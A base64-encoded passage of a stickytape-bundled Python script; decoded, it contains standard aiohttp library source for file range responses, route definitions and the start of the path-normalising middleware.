hdHVzX2NvZGUpXHJcbiAgICAgICAgICAgICAgICByZXR1cm4gYXdhaXQgc3VwZXIoKS5wcmVwYXJlKHJlcXVlc3QpXHJcblxyXG4gICAgICAgICAgICAjIElmIGEgcmFuZ2UgcmVxdWVzdCBoYXMgYmVlbiBtYWRlLCBjb252ZXJ0IHN0YXJ0LCBlbmQgc2xpY2VcclxuICAgICAgICAgICAgIyBub3RhdGlvbiBpbnRvIGZpbGUgcG9pbnRlciBvZmZzZXQgYW5kIGNvdW50XHJcbiAgICAgICAgICAgIGlmIHN0YXJ0IGlzIG5vdCBOb25lIG9yIGVuZCBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgICAgIGlmIHN0YXJ0IDwgMCBhbmQgZW5kIGlzIE5vbmU6ICAjIHJldHVybiB0YWlsIG9mIGZpbGVcclxuICAgICAgICAgICAgICAgICAgICBzdGFydCArPSBmaWxlX3NpemVcclxuICAgICAgICAgICAgICAgICAgICBpZiBzdGFydCA8IDA6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICMgaWYgUmFuZ2U6Ynl0ZXM9LTEwMDAgaW4gcmVxdWVzdCBoZWFkZXIgYnV0IGZpbGUgc2l6ZVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAjIGlzIG9ubHkgMjAwLCB0aGVyZSB3b3VsZCBiZSB0cm91YmxlIHdpdGhvdXQgdGhpc1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBzdGFydCA9IDBcclxuICAgICAgICAgICAgICAgICAgICBjb3VudCA9IGZpbGVfc2l6ZSAtIHN0YXJ0XHJcbiAgICAgICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgICAgICMgcmZjNzIzMzpJZiB0aGUgbGFzdC1ieXRlLXBvcyB2YWx1ZSBpc1xyXG4gICAgICAgICAgICAgICAgICAgICMgYWJzZW50LCBvciBpZiB0aGUgdmFsdWUgaXMgZ3JlYXRlciB0aGFuIG9yIGVxdWFsIHRvXHJcbiAgICAgICAgICAgICAgICAgICAgIyB0aGUgY3VycmVudCBsZW5ndGggb2YgdGhlIHJlcHJlc2VudGF0aW9uIGRhdGEsXHJcbiAgICAgICAgICAgICAgICAgICAgIyB0aGUgYnl0ZSByYW5nZSBpcyBpbnRlcnByZXRlZCBhcyB0aGUgcmVtYWluZGVyXHJcbiAgICAgICAgICAgICAgICAgICAgIyBvZiB0aGUgcmVwcmVzZW50YXRpb24gKGkuZS4sIHRoZSBzZXJ2ZXIgcmVwbGFjZXMgdGhlXHJcbiAgICAgICAgICAgICAgICAgICAgIyB2YWx1ZSBvZiBsYXN0LWJ5dGUtcG9zIHdpdGggYSB2YWx1ZSB0aGF0IGlzIG9uZSBsZXNzIHRoYW5cclxuICAgICAgICAgICAgICAgICAgICAjIHRoZSBjdXJyZW50IGxlbmd0aCBvZiB0aGUgc2VsZWN0ZWQgcmVwcmVzZW50YXRpb24pLlxyXG4gICAgICAgICAgICAgICAgICAgIGNvdW50ID0gKFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBtaW4oZW5kIGlmIGVuZCBpcyBub3QgTm9uZSBlbHNlIGZpbGVfc2l6ZSwgZmlsZV9zaXplKSAtIHN0YXJ0XHJcbiAgICAgICAgICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICAgICAgICAgIGlmIHN0YXJ0ID49IGZpbGVfc2l6ZTpcclxuICAgICAgICAgICAgICAgICAgICAjIEhUVFAgNDE2IHNob3VsZCBiZSByZXR1cm5lZCBpbiB0aGlzIGNhc2UuXHJcbiAgICAgICAgICAgICAgICAgICAgI1xyXG4gICAgICAgICAgICAgICAgICAgICMgQWNjb3JkaW5nIHRvIGh0dHBzOi8vdG9vbHMuaWV0Zi5vcmcvaHRtbC9yZmM3MjMzOlxyXG4gICAgICAgICAgICAgICAgICAgICMgSWYgYSB2YWxpZCBieXRlLXJhbmdlLXNldCBpbmNsdWRlcyBhdCBsZWFzdCBvbmVcclxuICAgICAgICAgICAgICAgICAgICAjIGJ5dGUtcmFuZ2Utc3BlYyB3aXRoIGEgZmlyc3QtYnl0ZS1wb3MgdGhhdCBpcyBsZXNzIHRoYW5cclxuICAgICAgICAgICAgICAgICAgICAjIHRoZSBjdXJyZW50IGxlbmd0aCBvZiB0aGUgcmVwcmVzZW50YXRpb24sIG9yIGF0IGxlYXN0IG9uZVxyXG4gICAgICAgICAgICAgICAgICAgICMgc3VmZml4LWJ5dGUtcmFuZ2Utc3BlYyB3aXRoIGEgbm9uLXplcm8gc3VmZml4LWxlbmd0aCxcclxuICAgICAgICAgICAgICAgICAgICAjIHRoZW4gdGhlIGJ5dGUtcmFuZ2Utc2V0IGlzIHNhdGlzZmlhYmxlLiBPdGhlcndpc2UsIHRoZVxyXG4gICAgICAgICAgICAgICAgICAgICMgYnl0ZS1yYW5nZS1zZXQgaXMgdW5zYXRpc2ZpYWJsZS5cclxuICAgICAgICAgICAgICAgICAgICBzZWxmLmhlYWRlcnNbaGRycy5DT05URU5UX1JBTkdFXSA9IGYiYnl0ZXMgKi97ZmlsZV9zaXplfSJcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLnNldF9zdGF0dXMoSFRUUFJlcXVlc3RSYW5nZU5vdFNhdGlzZmlhYmxlLnN0YXR1c19jb2RlKVxyXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBhd2FpdCBzdXBlcigpLnByZXBhcmUocmVxdWVzdClcclxuXHJcbiAgICAgICAgICAgICAgICBzdGF0dXMgPSBIVFRQUGFydGlhbENvbnRlbnQuc3RhdHVzX2NvZGVcclxuICAgICAgICAgICAgICAgICMgRXZlbiB0aG91Z2ggeW91IGFyZSBzZW5kaW5nIHRoZSB3aG9sZSBmaWxlLCB5b3Ugc2hvdWxkIHN0aWxsXHJcbiAgICAgICAgICAgICAgICAjIHJldHVybiBhIEhUVFAgMjA2IGZvciBhIFJhbmdlIHJlcXVlc3QuXHJcbiAgICAgICAgICAgICAgICBzZWxmLnNldF9zdGF0dXMoc3RhdHVzKVxyXG5cclxuICAgICAgICBpZiBzaG91bGRfc2V0X2N0OlxyXG4gICAgICAgICAgICBzZWxmLmNvbnRlbnRfdHlwZSA9IGN0ICAjIHR5cGU6IGlnbm9yZVthc3NpZ25tZW50XVxyXG4gICAgICAgIGlmIGVuY29kaW5nOlxyXG4gICAgICAgICAgICBzZWxmLmhlYWRlcnNbaGRycy5DT05URU5UX0VOQ09ESU5HXSA9IGVuY29kaW5nXHJcbiAgICAgICAgaWYgZ3ppcDpcclxuICAgICAgICAgICAgc2VsZi5oZWFkZXJzW2hkcnMuVkFSWV0gPSBoZHJzLkFDQ0VQVF9FTkNPRElOR1xyXG5cclxuICAgICAgICBzZWxmLmV0YWcgPSBldGFnX3ZhbHVlICAjIHR5cGU6IGlnbm9yZVthc3NpZ25tZW50XVxyXG4gICAgICAgIHNlbGYubGFzdF9tb2RpZmllZCA9IHN0LnN0X210aW1lICAjIHR5cGU6IGlnbm9yZVthc3NpZ25tZW50XVxyXG4gICAgICAgIHNlbGYuY29udGVudF9sZW5ndGggPSBjb3VudFxyXG5cclxuICAgICAgICBzZWxmLmhlYWRlcnNbaGRycy5BQ0NFUFRfUkFOR0VTXSA9ICJieXRlcyJcclxuXHJcbiAgICAgICAgcmVhbF9zdGFydCA9IGNhc3QoaW50LCBzdGFydClcclxuXHJcbiAgICAgICAgaWYgc3RhdHVzID09IEhUVFBQYXJ0aWFsQ29udGVudC5zdGF0dXNfY29kZTpcclxuICAgICAgICAgICAgc2VsZi5oZWFkZXJzW2hkcnMuQ09OVEVOVF9SQU5HRV0gPSAiYnl0ZXMge30te30ve30iLmZvcm1hdChcclxuICAgICAgICAgICAgICAgIHJlYWxfc3RhcnQsIHJlYWxfc3RhcnQgKyBjb3VudCAtIDEsIGZpbGVfc2l6ZVxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgICMgSWYgd2UgYXJlIHNlbmRpbmcgMCBieXRlcyBjYWxsaW5nIHNlbmRmaWxlKCkgd2lsbCB0aHJvdyBhIFZhbHVlRXJyb3JcclxuICAgICAgICBpZiBjb3VudCA9PSAwIG9yIHJlcXVlc3QubWV0aG9kID09IGhkcnMuTUVUSF9IRUFEIG9yIHNlbGYuc3RhdHVzIGluIFsyMDQsIDMwNF06XHJcbiAgICAgICAgICAgIHJldHVybiBhd2FpdCBzdXBlcigpLnByZXBhcmUocmVxdWVzdClcclxuXHJcbiAgICAgICAgZm9iaiA9IGF3YWl0IGxvb3AucnVuX2luX2V4ZWN1dG9yKE5vbmUsIGZpbGVwYXRoLm9wZW4sICJyYiIpXHJcbiAgICAgICAgaWYgc3RhcnQ6ICAjIGJlIGF3YXJlIHRoYXQgc3RhcnQgY291bGQgYmUgTm9uZSBvciBpbnQ9MCBoZXJlLlxyXG4gICAgICAgICAgICBvZmZzZXQgPSBzdGFydFxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIG9mZnNldCA9IDBcclxuXHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICByZXR1cm4gYXdhaXQgc2VsZi5fc2VuZGZpbGUocmVxdWVzdCwgZm9iaiwgb2Zmc2V0LCBjb3VudClcclxuICAgICAgICBmaW5hbGx5OlxyXG4gICAgICAgICAgICBhd2FpdCBsb29wLnJ1bl9pbl9leGVjdXRvcihOb25lLCBmb2JqLmNsb3NlKVxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnYWlvaHR0cC93ZWJfcm91dGVkZWYucHknLCBiJ2ltcG9ydCBhYmNcclxuaW1wb3J0IG9zICAjIG5vcWFcclxuZnJvbSB0eXBpbmcgaW1wb3J0IChcclxuICAgIFRZUEVfQ0hFQ0tJTkcsXHJcbiAgICBBbnksXHJcbiAgICBDYWxsYWJsZSxcclxuICAgIERpY3QsXHJcbiAgICBJdGVyYXRvcixcclxuICAgIExpc3QsXHJcbiAgICBPcHRpb25hbCxcclxuICAgIFNlcXVlbmNlLFxyXG4gICAgVHlwZSxcclxuICAgIFVuaW9uLFxyXG4gICAgb3ZlcmxvYWQsXHJcbilcclxuXHJcbmltcG9ydCBhdHRyXHJcblxyXG5mcm9tIC4gaW1wb3J0IGhkcnNcclxuZnJvbSAuYWJjIGltcG9ydCBBYnN0cmFjdFZpZXdcclxuZnJvbSAudHlwZWRlZnMgaW1wb3J0IEhhbmRsZXIsIFBhdGhMaWtlXHJcblxyXG5pZiBUWVBFX0NIRUNLSU5HOiAgIyBwcmFnbWE6IG5vIGNvdmVyXHJcbiAgICBmcm9tIC53ZWJfcmVxdWVzdCBpbXBvcnQgUmVxdWVzdFxyXG4gICAgZnJvbSAud2ViX3Jlc3BvbnNlIGltcG9ydCBTdHJlYW1SZXNwb25zZVxyXG4gICAgZnJvbSAud2ViX3VybGRpc3BhdGNoZXIgaW1wb3J0IEFic3RyYWN0Um91dGUsIFVybERpc3BhdGNoZXJcclxuZWxzZTpcclxuICAgIFJlcXVlc3QgPSBTdHJlYW1SZXNwb25zZSA9IFVybERpc3BhdGNoZXIgPSBBYnN0cmFjdFJvdXRlID0gTm9uZVxyXG5cclxuXHJcbl9fYWxsX18gPSAoXHJcbiAgICAiQWJzdHJhY3RSb3V0ZURlZiIsXHJcbiAgICAiUm91dGVEZWYiLFxyXG4gICAgIlN0YXRpY0RlZiIsXHJcbiAgICAiUm91dGVUYWJsZURlZiIsXHJcbiAgICAiaGVhZCIsXHJcbiAgICAib3B0aW9ucyIsXHJcbiAgICAiZ2V0IixcclxuICAgICJwb3N0IixcclxuICAgICJwYXRjaCIsXHJcbiAgICAicHV0IixcclxuICAgICJkZWxldGUiLFxyXG4gICAgInJvdXRlIixcclxuICAgICJ2aWV3IixcclxuICAgICJzdGF0aWMiLFxyXG4pXHJcblxyXG5cclxuY2xhc3MgQWJzdHJhY3RSb3V0ZURlZihhYmMuQUJDKTpcclxuICAgIEBhYmMuYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiByZWdpc3RlcihzZWxmLCByb3V0ZXI6IFVybERpc3BhdGNoZXIpIC0+IExpc3RbQWJzdHJhY3RSb3V0ZV06XHJcbiAgICAgICAgcGFzcyAgIyBwcmFnbWE6IG5vIGNvdmVyXHJcblxyXG5cclxuX0hhbmRsZXJUeXBlID0gVW5pb25bVHlwZVtBYnN0cmFjdFZpZXddLCBIYW5kbGVyXVxyXG5cclxuXHJcbkBhdHRyLnMoYXV0b19hdHRyaWJzPVRydWUsIGZyb3plbj1UcnVlLCByZXByPUZhbHNlLCBzbG90cz1UcnVlKVxyXG5jbGFzcyBSb3V0ZURlZihBYnN0cmFjdFJvdXRlRGVmKTpcclxuICAgIG1ldGhvZDogc3RyXHJcbiAgICBwYXRoOiBzdHJcclxuICAgIGhhbmRsZXI6IF9IYW5kbGVyVHlwZVxyXG4gICAga3dhcmdzOiBEaWN0W3N0ciwgQW55XVxyXG5cclxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgaW5mbyA9IFtdXHJcbiAgICAgICAgZm9yIG5hbWUsIHZhbHVlIGluIHNvcnRlZChzZWxmLmt3YXJncy5pdGVtcygpKTpcclxuICAgICAgICAgICAgaW5mby5hcHBlbmQoZiIsIHtuYW1lfT17dmFsdWUhcn0iKVxyXG4gICAgICAgIHJldHVybiAiPFJvdXRlRGVmIHttZXRob2R9IHtwYXRofSAtPiB7aGFuZGxlci5fX25hbWVfXyFyfSIgIntpbmZvfT4iLmZvcm1hdChcclxuICAgICAgICAgICAgbWV0aG9kPXNlbGYubWV0aG9kLCBwYXRoPXNlbGYucGF0aCwgaGFuZGxlcj1zZWxmLmhhbmRsZXIsIGluZm89IiIuam9pbihpbmZvKVxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgcmVnaXN0ZXIoc2VsZiwgcm91dGVyOiBVcmxEaXNwYXRjaGVyKSAtPiBMaXN0W0Fic3RyYWN0Um91dGVdOlxyXG4gICAgICAgIGlmIHNlbGYubWV0aG9kIGluIGhkcnMuTUVUSF9BTEw6XHJcbiAgICAgICAgICAgIHJlZyA9IGdldGF0dHIocm91dGVyLCAiYWRkXyIgKyBzZWxmLm1ldGhvZC5sb3dlcigpKVxyXG4gICAgICAgICAgICByZXR1cm4gW3JlZyhzZWxmLnBhdGgsIHNlbGYuaGFuZGxlciwgKipzZWxmLmt3YXJncyldXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgcmV0dXJuIFtcclxuICAgICAgICAgICAgICAgIHJvdXRlci5hZGRfcm91dGUoc2VsZi5tZXRob2QsIHNlbGYucGF0aCwgc2VsZi5oYW5kbGVyLCAqKnNlbGYua3dhcmdzKVxyXG4gICAgICAgICAgICBdXHJcblxyXG5cclxuQGF0dHIucyhhdXRvX2F0dHJpYnM9VHJ1ZSwgZnJvemVuPVRydWUsIHJlcHI9RmFsc2UsIHNsb3RzPVRydWUpXHJcbmNsYXNzIFN0YXRpY0RlZihBYnN0cmFjdFJvdXRlRGVmKTpcclxuICAgIHByZWZpeDogc3RyXHJcbiAgICBwYXRoOiBQYXRoTGlrZVxyXG4gICAga3dhcmdzOiBEaWN0W3N0ciwgQW55XVxyXG5cclxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgaW5mbyA9IFtdXHJcbiAgICAgICAgZm9yIG5hbWUsIHZhbHVlIGluIHNvcnRlZChzZWxmLmt3YXJncy5pdGVtcygpKTpcclxuICAgICAgICAgICAgaW5mby5hcHBlbmQoZiIsIHtuYW1lfT17dmFsdWUhcn0iKVxyXG4gICAgICAgIHJldHVybiAiPFN0YXRpY0RlZiB7cHJlZml4fSAtPiB7cGF0aH0iICJ7aW5mb30+Ii5mb3JtYXQoXHJcbiAgICAgICAgICAgIHByZWZpeD1zZWxmLnByZWZpeCwgcGF0aD1zZWxmLnBhdGgsIGluZm89IiIuam9pbihpbmZvKVxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgcmVnaXN0ZXIoc2VsZiwgcm91dGVyOiBVcmxEaXNwYXRjaGVyKSAtPiBMaXN0W0Fic3RyYWN0Um91dGVdOlxyXG4gICAgICAgIHJlc291cmNlID0gcm91dGVyLmFkZF9zdGF0aWMoc2VsZi5wcmVmaXgsIHNlbGYucGF0aCwgKipzZWxmLmt3YXJncylcclxuICAgICAgICByb3V0ZXMgPSByZXNvdXJjZS5nZXRfaW5mbygpLmdldCgicm91dGVzIiwge30pXHJcbiAgICAgICAgcmV0dXJuIGxpc3Qocm91dGVzLnZhbHVlcygpKVxyXG5cclxuXHJcbmRlZiByb3V0ZShtZXRob2Q6IHN0ciwgcGF0aDogc3RyLCBoYW5kbGVyOiBfSGFuZGxlclR5cGUsICoqa3dhcmdzOiBBbnkpIC0+IFJvdXRlRGVmOlxyXG4gICAgcmV0dXJuIFJvdXRlRGVmKG1ldGhvZCwgcGF0aCwgaGFuZGxlciwga3dhcmdzKVxyXG5cclxuXHJcbmRlZiBoZWFkKHBhdGg6IHN0ciwgaGFuZGxlcjogX0hhbmRsZXJUeXBlLCAqKmt3YXJnczogQW55KSAtPiBSb3V0ZURlZjpcclxuICAgIHJldHVybiByb3V0ZShoZHJzLk1FVEhfSEVBRCwgcGF0aCwgaGFuZGxlciwgKiprd2FyZ3MpXHJcblxyXG5cclxuZGVmIG9wdGlvbnMocGF0aDogc3RyLCBoYW5kbGVyOiBfSGFuZGxlclR5cGUsICoqa3dhcmdzOiBBbnkpIC0+IFJvdXRlRGVmOlxyXG4gICAgcmV0dXJuIHJvdXRlKGhkcnMuTUVUSF9PUFRJT05TLCBwYXRoLCBoYW5kbGVyLCAqKmt3YXJncylcclxuXHJcblxyXG5kZWYgZ2V0KFxyXG4gICAgcGF0aDogc3RyLFxyXG4gICAgaGFuZGxlcjogX0hhbmRsZXJUeXBlLFxyXG4gICAgKixcclxuICAgIG5hbWU6IE9wdGlvbmFsW3N0cl0gPSBOb25lLFxyXG4gICAgYWxsb3dfaGVhZDogYm9vbCA9IFRydWUsXHJcbiAgICAqKmt3YXJnczogQW55LFxyXG4pIC0+IFJvdXRlRGVmOlxyXG4gICAgcmV0dXJuIHJvdXRlKFxyXG4gICAgICAgIGhkcnMuTUVUSF9HRVQsIHBhdGgsIGhhbmRsZXIsIG5hbWU9bmFtZSwgYWxsb3dfaGVhZD1hbGxvd19oZWFkLCAqKmt3YXJnc1xyXG4gICAgKVxyXG5cclxuXHJcbmRlZiBwb3N0KHBhdGg6IHN0ciwgaGFuZGxlcjogX0hhbmRsZXJUeXBlLCAqKmt3YXJnczogQW55KSAtPiBSb3V0ZURlZjpcclxuICAgIHJldHVybiByb3V0ZShoZHJzLk1FVEhfUE9TVCwgcGF0aCwgaGFuZGxlciwgKiprd2FyZ3MpXHJcblxyXG5cclxuZGVmIHB1dChwYXRoOiBzdHIsIGhhbmRsZXI6IF9IYW5kbGVyVHlwZSwgKiprd2FyZ3M6IEFueSkgLT4gUm91dGVEZWY6XHJcbiAgICByZXR1cm4gcm91dGUoaGRycy5NRVRIX1BVVCwgcGF0aCwgaGFuZGxlciwgKiprd2FyZ3MpXHJcblxyXG5cclxuZGVmIHBhdGNoKHBhdGg6IHN0ciwgaGFuZGxlcjogX0hhbmRsZXJUeXBlLCAqKmt3YXJnczogQW55KSAtPiBSb3V0ZURlZjpcclxuICAgIHJldHVybiByb3V0ZShoZHJzLk1FVEhfUEFUQ0gsIHBhdGgsIGhhbmRsZXIsICoqa3dhcmdzKVxyXG5cclxuXHJcbmRlZiBkZWxldGUocGF0aDogc3RyLCBoYW5kbGVyOiBfSGFuZGxlclR5cGUsICoqa3dhcmdzOiBBbnkpIC0+IFJvdXRlRGVmOlxyXG4gICAgcmV0dXJuIHJvdXRlKGhkcnMuTUVUSF9ERUxFVEUsIHBhdGgsIGhhbmRsZXIsICoqa3dhcmdzKVxyXG5cclxuXHJcbmRlZiB2aWV3KHBhdGg6IHN0ciwgaGFuZGxlcjogVHlwZVtBYnN0cmFjdFZpZXddLCAqKmt3YXJnczogQW55KSAtPiBSb3V0ZURlZjpcclxuICAgIHJldHVybiByb3V0ZShoZHJzLk1FVEhfQU5ZLCBwYXRoLCBoYW5kbGVyLCAqKmt3YXJncylcclxuXHJcblxyXG5kZWYgc3RhdGljKHByZWZpeDogc3RyLCBwYXRoOiBQYXRoTGlrZSwgKiprd2FyZ3M6IEFueSkgLT4gU3RhdGljRGVmOlxyXG4gICAgcmV0dXJuIFN0YXRpY0RlZihwcmVmaXgsIHBhdGgsIGt3YXJncylcclxuXHJcblxyXG5fRGVjbyA9IENhbGxhYmxlW1tfSGFuZGxlclR5cGVdLCBfSGFuZGxlclR5cGVdXHJcblxyXG5cclxuY2xhc3MgUm91dGVUYWJsZURlZihTZXF1ZW5jZVtBYnN0cmFjdFJvdXRlRGVmXSk6XHJcbiAgICAiIiJSb3V0ZSBkZWZpbml0aW9uIHRhYmxlIiIiXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5faXRlbXMgPSBbXSAgIyB0eXBlOiBMaXN0W0Fic3RyYWN0Um91dGVEZWZdXHJcblxyXG4gICAgZGVmIF9fcmVwcl9fKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICByZXR1cm4gZiI8Um91dGVUYWJsZURlZiBjb3VudD17bGVuKHNlbGYuX2l0ZW1zKX0+IlxyXG5cclxuICAgIEBvdmVybG9hZFxyXG4gICAgZGVmIF9fZ2V0aXRlbV9fKHNlbGYsIGluZGV4OiBpbnQpIC0+IEFic3RyYWN0Um91dGVEZWY6XHJcbiAgICAgICAgLi4uXHJcblxyXG4gICAgQG92ZXJsb2FkXHJcbiAgICBkZWYgX19nZXRpdGVtX18oc2VsZiwgaW5kZXg6IHNsaWNlKSAtPiBMaXN0W0Fic3RyYWN0Um91dGVEZWZdOlxyXG4gICAgICAgIC4uLlxyXG5cclxuICAgIGRlZiBfX2dldGl0ZW1fXyhzZWxmLCBpbmRleCk6ICAjIHR5cGU6IGlnbm9yZVtuby11bnR5cGVkLWRlZl1cclxuICAgICAgICByZXR1cm4gc2VsZi5faXRlbXNbaW5kZXhdXHJcblxyXG4gICAgZGVmIF9faXRlcl9fKHNlbGYpIC0+IEl0ZXJhdG9yW0Fic3RyYWN0Um91dGVEZWZdOlxyXG4gICAgICAgIHJldHVybiBpdGVyKHNlbGYuX2l0ZW1zKVxyXG5cclxuICAgIGRlZiBfX2xlbl9fKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gbGVuKHNlbGYuX2l0ZW1zKVxyXG5cclxuICAgIGRlZiBfX2NvbnRhaW5zX18oc2VsZiwgaXRlbTogb2JqZWN0KSAtPiBib29sOlxyXG4gICAgICAgIHJldHVybiBpdGVtIGluIHNlbGYuX2l0ZW1zXHJcblxyXG4gICAgZGVmIHJvdXRlKHNlbGYsIG1ldGhvZDogc3RyLCBwYXRoOiBzdHIsICoqa3dhcmdzOiBBbnkpIC0+IF9EZWNvOlxyXG4gICAgICAgIGRlZiBpbm5lcihoYW5kbGVyOiBfSGFuZGxlclR5cGUpIC0+IF9IYW5kbGVyVHlwZTpcclxuICAgICAgICAgICAgc2VsZi5faXRlbXMuYXBwZW5kKFJvdXRlRGVmKG1ldGhvZCwgcGF0aCwgaGFuZGxlciwga3dhcmdzKSlcclxuICAgICAgICAgICAgcmV0dXJuIGhhbmRsZXJcclxuXHJcbiAgICAgICAgcmV0dXJuIGlubmVyXHJcblxyXG4gICAgZGVmIGhlYWQoc2VsZiwgcGF0aDogc3RyLCAqKmt3YXJnczogQW55KSAtPiBfRGVjbzpcclxuICAgICAgICByZXR1cm4gc2VsZi5yb3V0ZShoZHJzLk1FVEhfSEVBRCwgcGF0aCwgKiprd2FyZ3MpXHJcblxyXG4gICAgZGVmIGdldChzZWxmLCBwYXRoOiBzdHIsICoqa3dhcmdzOiBBbnkpIC0+IF9EZWNvOlxyXG4gICAgICAgIHJldHVybiBzZWxmLnJvdXRlKGhkcnMuTUVUSF9HRVQsIHBhdGgsICoqa3dhcmdzKVxyXG5cclxuICAgIGRlZiBwb3N0KHNlbGYsIHBhdGg6IHN0ciwgKiprd2FyZ3M6IEFueSkgLT4gX0RlY286XHJcbiAgICAgICAgcmV0dXJuIHNlbGYucm91dGUoaGRycy5NRVRIX1BPU1QsIHBhdGgsICoqa3dhcmdzKVxyXG5cclxuICAgIGRlZiBwdXQoc2VsZiwgcGF0aDogc3RyLCAqKmt3YXJnczogQW55KSAtPiBfRGVjbzpcclxuICAgICAgICByZXR1cm4gc2VsZi5yb3V0ZShoZHJzLk1FVEhfUFVULCBwYXRoLCAqKmt3YXJncylcclxuXHJcbiAgICBkZWYgcGF0Y2goc2VsZiwgcGF0aDogc3RyLCAqKmt3YXJnczogQW55KSAtPiBfRGVjbzpcclxuICAgICAgICByZXR1cm4gc2VsZi5yb3V0ZShoZHJzLk1FVEhfUEFUQ0gsIHBhdGgsICoqa3dhcmdzKVxyXG5cclxuICAgIGRlZiBkZWxldGUoc2VsZiwgcGF0aDogc3RyLCAqKmt3YXJnczogQW55KSAtPiBfRGVjbzpcclxuICAgICAgICByZXR1cm4gc2VsZi5yb3V0ZShoZHJzLk1FVEhfREVMRVRFLCBwYXRoLCAqKmt3YXJncylcclxuXHJcbiAgICBkZWYgdmlldyhzZWxmLCBwYXRoOiBzdHIsICoqa3dhcmdzOiBBbnkpIC0+IF9EZWNvOlxyXG4gICAgICAgIHJldHVybiBzZWxmLnJvdXRlKGhkcnMuTUVUSF9BTlksIHBhdGgsICoqa3dhcmdzKVxyXG5cclxuICAgIGRlZiBzdGF0aWMoc2VsZiwgcHJlZml4OiBzdHIsIHBhdGg6IFBhdGhMaWtlLCAqKmt3YXJnczogQW55KSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuX2l0ZW1zLmFwcGVuZChTdGF0aWNEZWYocHJlZml4LCBwYXRoLCBrd2FyZ3MpKVxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnYWlvaHR0cC93ZWJfbWlkZGxld2FyZXMucHknLCBiJ2ltcG9ydCByZVxyXG5mcm9tIHR5cGluZyBpbXBvcnQgVFlQRV9DSEVDS0lORywgQXdhaXRhYmxlLCBDYWxsYWJsZSwgVHVwbGUsIFR5cGUsIFR5cGVWYXJcclxuXHJcbmZyb20gLnR5cGVkZWZzIGltcG9ydCBIYW5kbGVyXHJcbmZyb20gLndlYl9leGNlcHRpb25zIGltcG9ydCBIVFRQUGVybWFuZW50UmVkaXJlY3QsIF9IVFRQTW92ZVxyXG5mcm9tIC53ZWJfcmVxdWVzdCBpbXBvcnQgUmVxdWVzdFxyXG5mcm9tIC53ZWJfcmVzcG9uc2UgaW1wb3J0IFN0cmVhbVJlc3BvbnNlXHJcbmZyb20gLndlYl91cmxkaXNwYXRjaGVyIGltcG9ydCBTeXN0ZW1Sb3V0ZVxyXG5cclxuX19hbGxfXyA9IChcclxuICAgICJtaWRkbGV3YXJlIixcclxuICAgICJub3JtYWxpemVfcGF0aF9taWRkbGV3YXJlIixcclxuKVxyXG5cclxuaWYgVFlQRV9DSEVDS0lORzogICMgcHJhZ21hOiBubyBjb3ZlclxyXG4gICAgZnJvbSAud2ViX2FwcCBpbXBvcnQgQXBwbGljYXRpb25cclxuXHJcbl9GdW5jID0gVHlwZVZhcigiX0Z1bmMiKVxyXG5cclxuXHJcbmFzeW5jIGRlZiBfY2hlY2tfcmVxdWVzdF9yZXNvbHZlcyhyZXF1ZXN0OiBSZXF1ZXN0LCBwYXRoOiBzdHIpIC0+IFR1cGxlW2Jvb2wsIFJlcXVlc3RdOlxyXG4gICAgYWx0X3JlcXVlc3QgPSByZXF1ZXN0LmNsb25lKHJlbF91cmw9cGF0aClcclxuXHJcbiAgICBtYXRjaF9pbmZvID0gYXdhaXQgcmVxdWVzdC5hcHAucm91dGVyLnJlc29sdmUoYWx0X3JlcXVlc3QpXHJcbiAgICBhbHRfcmVxdWVzdC5fbWF0Y2hfaW5mbyA9IG1hdGNoX2luZm9cclxuXHJcbiAgICBpZiBtYXRjaF9pbmZvLmh0dHBfZXhjZXB0aW9uIGlzIE5vbmU6XHJcbiAgICAgICAgcmV0dXJuIFRydWUsIGFsdF9yZXF1ZXN0XHJcblxyXG4gICAgcmV0dXJuIEZhbHNlLCByZXF1ZXN0XHJcblxyXG5cclxuZGVmIG1pZGRsZXdhcmUoZjogX0Z1bmMpIC0+IF9GdW5jOlxyXG4gICAgZi5fX21pZGRsZXdhcmVfdmVyc2lvbl9fID0gMSAgIyB0eXBlOiBpZ25vcmVbYXR0ci1kZWZpbmVkXVxyXG4gICAgcmV0dXJuIGZcclxuXHJcblxyXG5fTWlkZGxld2FyZSA9IENhbGxhYmxlW1tSZXF1ZXN0LCBIYW5kbGVyXSwgQXdhaXRhYmxlW1N0cmVhbVJlc3BvbnNlXV1cclxuXHJcblxyXG5kZWYgbm9ybWFsaXplX3BhdGhfbWlkZGxld2FyZShcclxuICAgICosXHJcbiAgICBhcHBlbmRfc2xhc2g6IGJvb2wgPSBUcnVlLFxyXG4gICAgcmVtb3ZlX3NsYXNoOiBib29sID0gRmFsc2UsXHJcbiAgICBtZXJnZV9zbGFzaGVzOiBib29sID0gVHJ1ZSxcclxuICAgIHJlZGlyZWN0X2NsYXNzOiBUeXBlW19IVFRQTW92ZV0gPSBIVFRQUGVybWFuZW50UmVkaXJlY3QsXHJcbikgLT4gX01pZGRsZXdhcmU6XHJcbiAgICAiIiJGYWN0b3J5IGZvciBwcm9kdWNpbmcgYSBtaWRkbGV3YXJlIHRoYXQgbm9ybWFsaXplcyB0aGUgcGF0a